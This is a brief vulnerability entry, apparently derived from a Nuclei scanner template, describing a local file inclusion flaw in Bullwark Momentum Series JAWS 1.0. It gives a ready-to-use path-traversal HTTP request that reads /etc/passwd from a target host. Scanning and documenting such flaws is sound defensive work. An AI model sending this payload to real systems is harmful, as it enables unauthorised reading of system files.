# Vulnerability: Bullwark Momentum Series JAWS 1.0 - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`bullwark-momentum-lfi.yaml`)

## Description
Bullwark Momentum Series JAWS 1.0 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Referer: {{Hostname}}
```

